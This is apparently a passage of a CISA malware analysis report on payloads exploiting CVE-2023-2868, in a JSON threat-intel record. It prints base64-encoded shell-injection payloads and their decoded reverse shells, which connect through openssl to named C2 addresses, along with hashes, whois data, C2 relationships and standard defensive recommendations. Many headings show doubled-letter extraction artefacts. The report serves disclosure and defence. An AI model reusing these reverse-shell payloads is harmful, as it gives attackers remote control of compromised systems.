Payload-'`abcdefg=c2V0c2lkIHNoIC1jICJta2ZpZm8gL3RtcC9wO3NoIC1pIDwvdG1wL3AgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29u\nbmVjdCAxMDcuMTQ4LjIyMy4xOTY6NDQzID4vdG1wL3AgMj4vZGV2L251bGw7cm0gL3RtcC9wIg==;ee=ba;G=s;\"ech\"o\n$abcdefg|${ee}se64 -d|${G}h;wh66489.txt`'\n--End Payload-\n--Begin Decoded Payload-setsid sh -c \"mkfifo /tmp/p;sh -i </tmp/p 2>&1|openssl s_client -quiet -connect 107[.]148[.]223[.]196:443 >/tmp/p 2>/dev/null;rm\n/tmp/p\"\n--End Decoded Payload-\n110077[[..]]114488[[..]]222233[[..]]119966\n\n\nTTaaggss\n\n\ncommand-and-control\n\n\nPPoorrttss\n\n\n\n- 443 TCP\n\n- 8080 TCP\n\n\nWWhhooiiss\n\n\nNetRange:   107.148.0.0 - 107.149.255.255\nCIDR:     107.148.0.0/15\nNetName:    PT-82-10\nNetHandle:   NET-107-148-0-0-1\n\n\n-----\n\nParent:     NET107 (NET-107-0-0-0-0)\nNetType:    Direct Allocation\nOriginAS:   AS398478, AS398993, AS399195, AS54600, AS398823\nOrganization: PEG TECH INC (PT-82)\nRegDate:    2013-11-08\nUpdated:    2021-01-06\nRef:      https://rdap.arin.net/registry/ip/107.148.0.0\n\nOrgName:    PEG TECH INC\nOrgId:     PT-82\nAddress:    55 South Market Street, Suite 320\nCity:     San Jose\nStateProv:   CA\nPostalCode:   95113\nCountry:    US\nRegDate:    2012-03-27\nUpdated:    2017-01-28\nRef:      https://rdap.arin.net/registry/entity/PT-82\n\nOrgNOCHandle: NOC12550-ARIN\nOrgNOCName: NOC\nOrgNOCPhone: +1-657-206-5036\nOrgNOCEmail:\nOrgNOCRef:  https://rdap.arin.net/registry/entity/NOC12550-ARIN\n\nOrgAbuseHandle: ABUSE3497-ARIN\nOrgAbuseName: Abuse\nOrgAbusePhone: +1-657-206-5036\nOrgAbuseEmail:\nOrgAbuseRef:  https://rdap.arin.net/registry/entity/ABUSE3497-ARIN\n\nOrgTechHandle: NOC12550-ARIN\nOrgTechName: NOC\nOrgTechPhone: +1-657-206-5036\nOrgTechEmail:\nOrgTechRef:  https://rdap.arin.net/registry/entity/NOC12550-ARIN\n\n\nRReellaattiioonnsshhiippss\n\n\n949d4b01f31256e5e9c2b04e557dcca0a25fc\n107[.]148[.]223[.]196 Connected_From\n2f6aa3618936befc7525e1df788\n\n2a860849a9e68df0053556b85f20010a1384\n107[.]148[.]223[.]196 Connected_From\nb4c87594ba4f9bb3e1b1d287b095\n\ncf0996a3aee148bc060f4726435dd0d7f1af79\n107[.]148[.]223[.]196 Connected_From\n082277f407dfa07d81181322ba\n\ncaa795c4c934219d287379b20c2912af0f815\n107[.]148[.]223[.]196 Connected_From\nde95bb73e0f02f5fe6eb9aa50bd\n\n0b917d945a7491869fa5003f6b85c09f5f4579\n107[.]148[.]223[.]196 Connected_From\n5a7852a8b63ba1abdc9797d6a6\n\nb5113e29ec23f6e1be289b99dc7ac2af1c252b\n107[.]148[.]223[.]196 Connected_From\n4b6ff6e977f7827ab7fd686321\n\nb52a9844d8368abe70b6ba0d8df84f88c8c00\n107[.]148[.]223[.]196 Connected_From\n29dcbcf599665acd703b255d5d2\n\n9d0c7a45dd00d31a9724fa9e96cb8ac99dd5a\n107[.]148[.]223[.]196 Connected_From\n6502fe4515cedaabb2e58b1c5f5\n\n3f2ca19ad3635f379968b0302c7e42cf954f85\n107[.]148[.]223[.]196 Connected_From\nab61166c6f70acfebc72f38ab7\n\n80342108e9f0f1fd6b5c44e88006cebe37e4ec\n107[.]148[.]223[.]196 Connected_From\ncb3a0f567636b22ad210c0a043\n\nf536a7b75b7205762b75a037ebf6503029aab\n107[.]148[.]223[.]196 Connected_From\n1a02afab14b2709797c32e7e0fa\n\n\n-----\n\nf289b565839794fe4f450ed0c9343b8fb699f9\n107[.]148[.]223[.]196 Connected_From\n7544d9af2a60851abc8b4656e0\n\n2a5de691243f2b91f164c3021c157fbd783b4f\n107[.]148[.]223[.]196 Connected_From\n3e7d5f5950182e52ec868cd40b\n\n\nDDeessccrriippttiioonn\n\n\nThis IP address is used as C2 by the samples exploiting CVE-2023-2868.\n\n22bb22bb77cc55ee882255bb77aa1188ee1133331199bb44aa11227755aa00dddd00008866aabbdd5588bb22dd4455993399226699dd55aa661133aa4411ee77\n\n\nTTaaggss\n\n\nbackdoor trojan\n\n\nDDeettaaiillss\n\n\nNNaammee abcdefgc2V0c2lkIHNoIC1jICJta2ZpZm8gL3RtcC9wO3NoIC1pIDwvdG1wL3AgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xdW\nlldCAtY29ubmVjdCAxMDcuMTQ4LjIxOS41NDo0NDMgPi90bXAvcCAyPi9kZXYvbnVsbDtybSAvdG1wL3Ai_eebaGsecho_abc\ndefgeese64_dGhwh66489.txt\nSSiizzee 245 bytes\n\nTTyyppee ASCII text, with no line terminators\n\nMMDD55 212031b3a6e958fb7b545862407e5f7a\n\nSSHHAA11 693247647b55476a383579f07e7e1eb16fc86b70\n\nSSHHAA225566 2b2b7c5e825b7a18e13319b4a1275a0dd0086abd58b2d45939269d5a613a41e7\n\nSSHHAA551122 88453bf84dfcbf7b162a414e06d2c1038924844aebf6cac847130ccb1aa32debaaebee13ce58ffa2277e1aeadc101b8a\n7f4ac53b2caa7405467846c783be5f9a\nssssddeeeepp 6:a5YA5VJ94nqrz8r+pssRHUuHQjgxlopNO1oCb+LlvN7kqS200orzFn:a5YSVMn0k+phRPHQjgxl0Fk7PzF\n\nEEnnttrrooppyy 5.801599\n\n\nAAnnttiivviirruuss\n\n\nNo matches found.\n\n\nYYAARRAA RRuulleess\n\n\nNo matches found.\n\n\nssssddeeeepp MMaattcchheess\n\n\nNo matches found.\n\n\nRReellaattiioonnsshhiippss\n\n\n2b2b7c5e82... Connected_To 107[.]148[.]219[.]54\n\n\nDDeessccrriippttiioonn\n\n\nThis artifact contains a payload that exploits CVE-2023-2868. The exploit payload is a shell script code with an embedded Base64\nencoded reverse shell. Upon execution the malware base64 decodes and executes the reverse shell code. The reverse shell establishes\nconnections using the \"OpenSSL\" to the C2 IP address \"107[.]148[.]219[.]54\" and port “443” and redirects the standard input and\noutput to the named pipe \"/tmp/p\" and then removes \"/tmp/p\" after the connection is closed.\n\n--Begin Encoded Payload-'`abcdefg\\=c2V0c2lkIHNoIC1jICJta2ZpZm8gL3RtcC9wO3NoIC1pIDwvdG1wL3AgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29\nubmVjdCAxMDcuMTQ4LjIxOS41NDo0NDMgPi90bXAvcCAyPi9kZXYvbnVsbDtybSAvdG1wL3Ai;ee\\=ba;G\\=s;\"ech\"o $abcdefg;${ee}se64\n-d;${G}h;wh66489.txt`'\n--End Encoded Payload-\n--Begin Decoded Payload-setsid sh -c \"mkfifo /tmp/p;sh -i </tmp/p 2>&1|openssl s_client -quiet -connect 107[.]148[.]219[.]54:443 >/tmp/p 2>/dev/null;rm\n/tmp/p\"\n--End Decoded Payload-\n110077[[..]]114488[[..]]221199[[..]]5544\n\n\n-----\n\nTTaaggss\n\n\ncommand-and-control\n\n\nPPoorrttss\n\n\n\n- 443 TCP\n\n\nWWhhooiiss\n\n\nNetRange:   107.148.0.0 - 107.149.255.255\nCIDR:     107.148.0.0/15\nNetName:    PT-82-10\nNetHandle:   NET-107-148-0-0-1\nParent:     NET107 (NET-107-0-0-0-0)\nNetType:    Direct Allocation\nOriginAS:   AS398478, AS398993, AS399195, AS54600, AS398823\nOrganization: PEG TECH INC (PT-82)\nRegDate:    2013-11-08\nUpdated:    2021-01-06\nRef:      https://rdap.arin.net/registry/ip/107.148.0.0\n\nOrgName:    PEG TECH INC\nOrgId:     PT-82\nAddress:    55 South Market Street, Suite 320\nCity:     San Jose\nStateProv:   CA\nPostalCode:   95113\nCountry:    US\nRegDate:    2012-03-27\nUpdated:    2017-01-28\nRef:      https://rdap.arin.net/registry/entity/PT-82\n\nOrgAbuseHandle: ABUSE3497-ARIN\nOrgAbuseName: Abuse\nOrgAbusePhone: +1-657-206-5036\nOrgAbuseEmail:\nOrgAbuseRef:  https://rdap.arin.net/registry/entity/ABUSE3497-ARIN\n\nOrgTechHandle: NOC12550-ARIN\nOrgTechName: NOC\nOrgTechPhone: +1-657-206-5036\nOrgTechEmail:\nOrgTechRef:  https://rdap.arin.net/registry/entity/NOC12550-ARIN\n\nOrgNOCHandle: NOC12550-ARIN\nOrgNOCName: NOC\nOrgNOCPhone: +1-657-206-5036\nOrgNOCEmail:\nOrgNOCRef:  https://rdap.arin.net/registry/entity/NOC12550-ARIN\n\n\nRReellaattiioonnsshhiippss\n\n\n2b2b7c5e825b7a18e13319b4a1275a0dd008\n107[.]148[.]219[.]54 Connected_From\n6abd58b2d45939269d5a613a41e7\n\n\nDDeessccrriippttiioonn\n\n\nThis IP address is used as C2 by the samples exploiting CVE-2023-2868.\n\n## RReellaattiioonnsshhiipp SSuummmmaarryy\n\n2a860849a9... Connected_To 107[.]148[.]223[.]196\n\ncf0996a3ae... Connected_To 107[.]148[.]223[.]196\n\ncaa795c4c9... Connected_To 107[.]148[.]223[.]196\n\n0b917d945a... Connected_To 107[.]148[.]223[.]196\n\n\n-----\n\nb5113e29ec... Connected_To 107[.]148[.]223[.]196\n\nb52a9844d8... Connected_To 107[.]148[.]223[.]196\n\n9d0c7a45dd... Connected_To 107[.]148[.]223[.]196\n\n3f2ca19ad3... Connected_To 107[.]148[.]223[.]196\n\n80342108e9... Connected_To 107[.]148[.]223[.]196\n\nf536a7b75b... Connected_To 107[.]148[.]223[.]196\n\n2a5de691243f2b91f164c3021c157fbd783b4f\n949d4b01f3... Dropped\n3e7d5f5950182e52ec868cd40b\n\n949d4b01f3... Connected_To 107[.]148[.]223[.]196\n\n2a5de691243f2b91f164c3021c157fbd783b4f\nf289b56583... Dropped\n3e7d5f5950182e52ec868cd40b\n\nf289b56583... Connected_To 107[.]148[.]223[.]196\n\n949d4b01f31256e5e9c2b04e557dcca0a25fc\n2a5de69124... Dropped_By\n2f6aa3618936befc7525e1df788\n\nf289b565839794fe4f450ed0c9343b8fb699f9\n2a5de69124... Dropped_By\n7544d9af2a60851abc8b4656e0\n\n2a5de69124... Connected_To 107[.]148[.]223[.]196\n\n949d4b01f31256e5e9c2b04e557dcca0a25fc\n107[.]148[.]223[.]196 Connected_From\n2f6aa3618936befc7525e1df788\n\n2a860849a9e68df0053556b85f20010a1384\n107[.]148[.]223[.]196 Connected_From\nb4c87594ba4f9bb3e1b1d287b095\n\ncf0996a3aee148bc060f4726435dd0d7f1af79\n107[.]148[.]223[.]196 Connected_From\n082277f407dfa07d81181322ba\n\ncaa795c4c934219d287379b20c2912af0f815\n107[.]148[.]223[.]196 Connected_From\nde95bb73e0f02f5fe6eb9aa50bd\n\n0b917d945a7491869fa5003f6b85c09f5f4579\n107[.]148[.]223[.]196 Connected_From\n5a7852a8b63ba1abdc9797d6a6\n\nb5113e29ec23f6e1be289b99dc7ac2af1c252b\n107[.]148[.]223[.]196 Connected_From\n4b6ff6e977f7827ab7fd686321\n\nb52a9844d8368abe70b6ba0d8df84f88c8c00\n107[.]148[.]223[.]196 Connected_From\n29dcbcf599665acd703b255d5d2\n\n9d0c7a45dd00d31a9724fa9e96cb8ac99dd5a\n107[.]148[.]223[.]196 Connected_From\n6502fe4515cedaabb2e58b1c5f5\n\n3f2ca19ad3635f379968b0302c7e42cf954f85\n107[.]148[.]223[.]196 Connected_From\nab61166c6f70acfebc72f38ab7\n\n80342108e9f0f1fd6b5c44e88006cebe37e4ec\n107[.]148[.]223[.]196 Connected_From\ncb3a0f567636b22ad210c0a043\n\nf536a7b75b7205762b75a037ebf6503029aab\n107[.]148[.]223[.]196 Connected_From\n1a02afab14b2709797c32e7e0fa\n\nf289b565839794fe4f450ed0c9343b8fb699f9\n107[.]148[.]223[.]196 Connected_From\n7544d9af2a60851abc8b4656e0\n\n2a5de691243f2b91f164c3021c157fbd783b4f\n107[.]148[.]223[.]196 Connected_From\n3e7d5f5950182e52ec868cd40b\n\n2b2b7c5e82... Connected_To 107[.]148[.]219[.]54\n\n2b2b7c5e825b7a18e13319b4a1275a0dd008\n107[.]148[.]219[.]54 Connected_From\n6abd58b2d45939269d5a613a41e7\n\n## RReeccoommmmeennddaattiioonnss\n\nCISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their\norganization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to\navoid unwanted impacts.\n\n - Maintain up-to-date antivirus signatures and engines.\n\n\n-----\n\n - Keep operating system patches up-to-date.\n\n - Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.\n\n - Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators\n\ngroup unless required.\n\n - Enforce a strong password policy and implement regular password changes.\n\n - Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.\n\n - Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.\n\n - Disable unnecessary services on agency workstations and servers.\n\n - Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its \"true file type\" (i.e., the extension matches\n\nthe file header).\n\n - Monitor users' web browsing habits; restrict access to sites with unfavorable content.\n\n - Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).\n\n - Scan all software downloaded from the Internet prior to executing.\n\n - Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).\n\nAdditional information on malware incident prevention and handling can be found in National Institute of Standards and Technology\n(NIST) Special Publication 800-83, \"\"GGuuiiddee ttoo MMaallwwaarree IInncciiddeenntt PPrreevveennttiioonn && HHaannddlliinngg ffoorr DDeesskkttooppss aanndd LLaappttooppss\"\"..\n\n## CCoonnttaacctt IInnffoorrmmaattiioonn\n\n - 1-888-282-0870\n\n[• CISA Service Desk (UNCLASS)](mailto:CISAservicedesk@cisa.dhs.gov)\n\n[• CISA SIPR (SIPRNET)](mailto:NCCIC@dhs.sgov.gov)\n\n[• CISA IC (JWICS)](mailto:NCCIC@dhs.ic.gov)\n\nCISA continuously strives to improve its products and services. You can help by answering a very short series of questions about this\nproduct at the following URL: [https://us-cert.cisa.gov/forms/feedback/](https://us-cert.cisa.gov/forms/feedback/)\n\n## DDooccuummeenntt FFAAQQ\n\nWWhhaatt iiss aa MMIIFFRR?? A Malware Initial Findings Report (MIFR) is intended to provide organizations with malware analysis in a timely\nmanner. In most instances this report will provide initial indicators for computer and network defense. To request additional analysis,\nplease contact CISA and provide information regarding the level of desired analysis.\nWWhhaatt iiss aa MMAARR?? A Malware Analysis Report (MAR) is intended to provide organizations with more detailed malware analysis acquired\nvia manual reverse engineering. To request additional analysis, please contact CISA and provide information regarding the level of\ndesired analysis.\nCCaann II eeddiitt tthhiiss ddooccuummeenntt?? This document is not to be edited in any way by recipients. All comments or questions related to this\ndocument should be directed to the CISA at 1-888-282-0870 or [CISA Service Desk.](mailto:CISAservicedesk@cisa.dhs.gov)\nCCaann II ssuubbmmiitt mmaallwwaarree ttoo CCIISSAA?? Malware samples can be submitted via three methods:\n\n[• Web: https://malware.us-cert.gov](https://malware.us-cert.gov/)\n\n - E-Mail: [submit@malware.us-cert.gov](mailto:submit@malware.us-cert.gov)\n\n - FTP: ftp.malware.us-cert.gov (anonymous)\n\nCISA encourages you to report any suspicious activity, including cybersecurity incidents, possible malicious code, software\nvulnerabilities, and phishing-related scams. Reporting forms can be found on CISA's homepage at [www.cisa.gov.](http://www.cisa.gov/)\n\n\n## TTLLPP:: CCLLEEAARR\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        },
        {
            "id": "6825b8cb-7d82-43d2-b0b0-d51c7e255b42",
            "created_at": "2023-01-06T13:46:37.642134Z",
            "updated_at": "2023-01-06T13:46:37.642134Z",
            "deleted_at": null,
            "name": "MISPGALAXY",
            "url": "https://www.misp-project.org/galaxy.html",
            "description": "MISP Galaxy Clusters",
            "reports": null
        }
    ],
    "references": [
        "https://www.cisa.gov/sites/default/files/2023-07/MAR-10454006.r3.v1.CLEAR_.pdf"
    ],
    "report_names": [
        "MAR-10454006.r3.v1.CLEAR_.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1737943504,
    "ts_updated_at": 1743041149,
    "ts_creation_date": 1690488777,
    "ts_modification_date": 1690488777,
    "files": {
        "pdf": "https://archive.orkl.eu/d1a2ad5c5ea75f05d67f37f2d80ab88d80db7cf5.pdf",
        "text": "https://archive.orkl.eu/d1a2ad5c5ea75f05d67f37f2d80ab88d80db7cf5.txt",
        "img": "https://archive.orkl.eu/d1a2ad5c5ea75f05d67f37f2d80ab88d80db7cf5.jpg"
    }
}